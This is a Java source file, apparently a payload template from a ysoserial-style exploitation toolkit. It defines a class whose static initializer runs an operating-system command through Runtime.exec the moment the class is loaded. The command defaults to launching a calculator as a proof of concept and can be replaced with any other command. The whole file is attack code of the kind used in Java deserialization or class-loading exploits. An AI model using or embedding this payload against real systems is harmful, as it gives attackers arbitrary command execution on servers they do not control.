package com.h2tg.ysogate.template;

import java.io.IOException;

public class CalcTemplate
{
    public static String cmd;

    static {
        try {
            if (cmd == null) {
                cmd = "calc";
            }
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
